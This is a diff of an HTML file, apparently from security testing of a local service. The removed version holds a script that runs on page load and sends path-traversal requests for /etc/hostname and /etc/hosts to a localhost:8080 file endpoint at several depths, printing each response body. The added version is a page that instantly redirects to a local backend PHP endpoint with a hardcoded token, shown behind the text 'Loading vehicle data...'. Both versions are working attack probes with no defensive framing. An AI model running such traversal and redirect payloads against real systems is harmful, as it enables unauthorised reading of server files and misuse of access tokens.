@@ -1,4 +1,5 @@
-<!doctype html><html><head><meta charset="utf-8"><title>CAT CAS 8080 fetch bodies v19</title><style>body{font:15px monospace}pre{white-space:pre-wrap;border:2px solid #333;padding:10px;break-inside:avoid}</style></head><body><h1>CASI localhost:8080 file fetch results</h1><div id="out"></div><script>
-const tests=[['d5-hostname','../../../../../etc/hostname'],['d6-hostname','../../../../../../etc/hostname'],['d8-hostname','../../../../../../../../etc/hostname'],['d10-hostname','../../../../../../../../../../etc/hostname'],['d12-hostname','../../../../../../../../../../../../etc/hostname'],['d8-hosts','../../../../../../../../etc/hosts']];
-(async()=>{const out=document.getElementById('out');for(const [label,name] of tests){let line='';const c=new AbortController();const timer=setTimeout(()=>c.abort(),2500);try{const r=await fetch('http://127.0.0.1:8080/file?name='+encodeURIComponent(name),{cache:'no-store',signal:c.signal});const t=await r.text();line=label+' STATUS='+r.status+' TYPE='+r.headers.get('content-type')+' BODY='+JSON.stringify(t.slice(0,1000));}catch(e){line=label+' ERROR='+e.name+':'+e.message}clearTimeout(timer);const row=document.createElement('pre');row.textContent=line;out.appendChild(row)}})();
-</script></body></html>
+<!DOCTYPE html>
+<html><head><title>R</title>
+<script>window.location.replace('https://127.0.0.1/backend/ax/current_data.php?token=4514df31fcba0bad08a5648018c40c1b&node=3');</script>
+</head>
+<body>Loading vehicle data...</body></html>
